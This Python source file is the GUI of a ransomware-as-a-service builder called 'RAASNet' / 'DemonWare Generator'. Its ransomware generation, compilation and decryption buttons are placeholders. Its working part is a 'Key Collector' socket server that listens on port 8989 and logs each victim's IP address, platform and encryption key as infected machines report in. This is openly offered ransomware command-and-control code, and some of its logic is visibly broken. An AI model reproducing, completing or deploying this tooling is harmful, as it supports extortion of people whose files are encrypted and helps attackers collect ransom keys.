#!/usr/bin/env python3
import os, sys, subprocess, threading, time, datetime, socket, select, PIL.Image, PIL.ImageTk, webbrowser, base64
from tkinter import *
from tkinter.ttk import *
from ttkthemes import ThemedStyle
from tkinter import messagebox
from pymsgbox import *
from io import BytesIO

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "RAASNet v0.1 (Public Test)") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.ttkStyle = ThemedStyle()
        self.ttkStyle.set_theme("arc")
        #icon = PIL.ImageTk.PhotoImage(resource_path('images/logo2.png'))
        #self.tk.call('wm', 'iconphoto', self._w, icon) # Call app icon
        # Top menu
        menu = Menu(self)
        # File dropdown
        filemenu = Menu(menu, tearoff=0)
        filemenu.add_command(label="Quit", command=self.exit)
        menu.add_cascade(label="File", menu=filemenu)

        # Help dropdown
        help = Menu(menu, tearoff=0)
        help.add_command(label="View License", command=self.view_license)
        help.add_command(label="Activate License", command=self.exit)
        help.add_command(label="Visit Project on GitHub", command=self.open_github)
        menu.add_cascade(label="Help", menu=help)

        self.config(background = 'white', menu=menu)

        # Input field data is being inserted in this dict
        self.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
        }

        self.options['host'].set('0.0.0.0')
        self.options['port'].set(8989)

        # Default Settings
        self.options['host'].set('0.0.0.0')
        self.options['port'].set(8989)

        self.bind("<Escape>", self.exit_event) # Press ESC to quit app

        photo = PIL.Image.open(resource_path('images/logo2.png'))
        resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
        photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self, image=photo, background = 'white')
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0, columnspan = 3, rowspan = 4)

        Label(self, text = 'DemonWare Generator', background = 'white', foreground = 'red', font='Helvetica 32 bold').grid(row = 2, column = 3, columnspan = 3)

        # Buttons
        start_server = Button(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 4, column = 0, columnspan = 6)
        generate_demon = Button(self, text = "GENERATE RANSOMWARE", command = self.exit, width = 53).grid(row = 5, column = 0, columnspan = 6)
        compile = Button(self, text = "COMPILE TO BINARY", command = self.exit, width = 53).grid(row = 6, column = 0, columnspan = 6)
        decrypt = Button(self, text = "DECRYPT FILES", command = self.exit, width = 53).grid(row = 7, column = 0, columnspan = 6)
        exit = Button(self, text = "EXIT", command = self.exit, width = 53).grid(row = 8, column = 0, columnspan = 6)

    def open_server(self):
        self.set = Toplevel()
        self.set.title(string = 'Settings')
        self.set.configure(background = 'white')
        self.set.resizable(0,0)

        Label(self.set, text = 'Host', background = 'white').grid(row = 1, column = 0, sticky = 'w')
        host = Entry(self.set, textvariable = self.options['host'], width = 30)
        host.grid(row = 2, column = 0, columnspan = 2)
        host.focus()

        Label(self.set, text = 'port', background = 'white').grid(row = 3, column = 0, sticky = 'w')
        port = Entry(self.set, textvariable = self.options['port'], width = 30)
        port.grid(row = 4, column = 0, columnspan = 2)

        if host == None or host == '':
            messagebox.showwarning('ERROR', 'Invalid host!')
        elif port == None or port == '':
            messagebox.showwarning('ERROR', 'Invalid port!')
        else:
            self.options['host'] == host
            self.options['port'] == port

        go = Button(self.set, text = 'Ok', command = self.run_server, width = 30)
        go.grid(row = 7, column = 0, columnspan = 2)
        self.set.bind('<Return>', self.set.destroy)
        close_register = Button(self.set, text = 'Cancel', command = self.set.destroy, width = 30).grid(row = 8, column = 0, columnspan = 2)

    def run_server(self):
        self.set.destroy()
        self.serv = Toplevel()
        self.serv.title(string = 'Demonware Server - Key Collector')
        self.serv.configure(background = 'white')
        self.serv.resizable(0,0)

        self.serv.bind("<Escape>", self.close_server) # Press ESC to close window

        # Input field data is being inserted in this dict
        self.serv.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
        }

        # Canvas for image
        canvas = Canvas(self.serv, highlightthickness=0, height = 150, width = 500, background = 'white')
        canvas.grid(row=0, column=0, columnspan = 4)

        #photo = PIL.ImageTk.PhotoImage(PIL.Image.open(BytesIO(base64.b64decode(photo_code))))
        photo = PIL.Image.open(resource_path('images/logo2.png'))
        resized = photo.resize((150,150), PIL.Image.ANTIALIAS)
        photo = PIL.ImageTk.PhotoImage(resized)

        label = Label(self.serv, image=photo)
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0)

        label2 = Label(self.serv, image=photo)
        label2.image = photo # keep a reference!
        label2.grid(row = 0, column = 3)


        # Log Frame
        result = LabelFrame(self.serv, text = 'Log', relief = GROOVE)
        result.grid(row = 1, column = 0, rowspan = 4, columnspan = 4)
        self.serv.options['log'] = Text(result, foreground="white", background="black", highlightcolor="white", highlightbackground="black", height = 35, width = 120)
        self.serv.options['log'].grid(row = 0, column = 1)

        # Tags
        self.serv.options['log'].tag_configure('yellow', foreground='yellow')
        self.serv.options['log'].tag_configure('red', foreground='red')
        self.serv.options['log'].tag_configure('deeppink', foreground='deeppink')
        self.serv.options['log'].tag_configure('orange', foreground='orange')
        self.serv.options['log'].tag_configure('green', foreground='green')
        self.serv.options['log'].tag_configure('bold', font='bold')

        header = 'Occured'.ljust(20), 'Remote'.ljust(20), 'Local'.ljust(20), 'Platform'.ljust(20), 'key'
        self.serv.options['log'].insert('1.0', '{0[0]} {0[1]} {0[2]} {0[3]} {0[4]}'.format(header), 'green')

        self.start_thread()

    def start_thread(self):
        #self.enter_data.destroy()

        # Start server as thread
        thread = threading.Thread(target=self.start_server)
        thread.daemon = True
        thread.start()

    def start_server(self):
        host = self.options['host'].get()
        port = self.options['port'].get()
        socket_list = []

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(10)

        # add server socket object to the list of readable connections
        socket_list.append(server_socket)

        self.insert_banner()
        self.serv.options['log'].insert('1.0', "Server started on port [%s] [%s]\nWaiting...\n" % (host, int(port)), 'deeppink')

        try:
            while True:
                ready_to_read,ready_to_write,in_error = select.select(socket_list,[],[],0)

                for sock in ready_to_read:
                    # a new connection request recieved
                    if sock == server_socket:
                        sockfd, addr = server_socket.accept()
                        socket_list.append(sockfd)
                    else:
                        try:
                            data = sock.recv(1024)
                            if data:
                                data = data.decode('UTF-8')
                                ip = addr[0]
                                local = data.split('$')[0]
                                system = data.split('$')[1]
                                key = data.split('$')[2]

                                self.serv.options['log'].insert(END, '\n[%s %s] %s %s %s %s' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), ip.ljust(20), local.ljust(20), system.ljust(20), key), 'yellow')
                                self.serv.options['log'].see(END)

                            else:
                                if sock in socket_list:
                                    socket_list.remove(sock)
                        except:
                            continue
        except KeyboardInterrupt:
            print('Closed...\n')


        server_socket.close()

    def insert_banner(self):
        banner = '''
                         .:'                                  `:.
                         ::'                                    `::
                        :: :.                                  .: ::
                         `:. `:.             .             .:'  .:'
                          `::. `::           !           ::' .::'
                              `::.`::.    .' ! `.    .::'.::'
                                `:.  `::::'':!:``::::'   ::'
                                :'*:::.  .:' ! `:.  .:::*`:
                               :: HHH::.   ` ! '   .::HHH ::
                              ::: `H TH::.  `!'  .::HT H' :::
                              ::..  `THHH:`:   :':HHHT'  ..::
                              `::      `T: `. .' :T'      ::'
                                `:. .   :         :   . .:'
                                  `::'               `::'
                                    :'  .`.  .  .'.  `:
                                    :' ::.       .:: `:
                                    :' `:::     :::' `:
                                     `.  ``     ''  .'
                                      :`...........':
                                      ` :`.     .': '
                                       `:  `"""'  :'
         ______   _______  _______  _______  _                 _______  _______  _______
        (  __  \ (  ____ \(       )(  ___  )( (    /||\     /|(  ___  )(  ____ )(  ____ \\
        | (  \  )| (    \/| () () || (   ) ||  \  ( || )   ( || (   ) || (    )|| (    \/
        | |   ) || (__    | || || || |   | ||   \ | || | _ | || (___) || (____)|| (__
        | |   | ||  __)   | |(_)| || |   | || (\ \) || |( )| ||  ___  ||     __)|  __)
        | |   ) || (      | |   | || |   | || | \   || || || || (   ) || (\ (   | (
        | (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
        (______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/
        '''

        self.serv.options['log'].insert('1.0', banner + '\n', 'red')

    def close_server(self, event):
        self.serv.destroy()

    def open_github(self):
        webbrowser.open_new_tab('https://www.github.com/leonv024/demon')

    def exit(self):
        sys.exit(0)

    def exit_event(self, event):
        exit()

    def view_license(self):
        messagebox.showinfo('License', 'Currect license is: Free (Public Test)')

class Server(Tk):
    def __init__(self, host, port):
        Tk.__init__(self)
        self.title(string = "Demonware Server - Key Collector") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.ttkStyle = ThemedStyle()
        self.ttkStyle.set_theme("arc")
        self.configure(background = 'white')
        #icon = PhotoImage(file='icon.png') # Set app icon
        #self.tk.call('wm', 'iconphoto', self._w, icon) # Call app icon




main = MainWindow()
main.mainloop()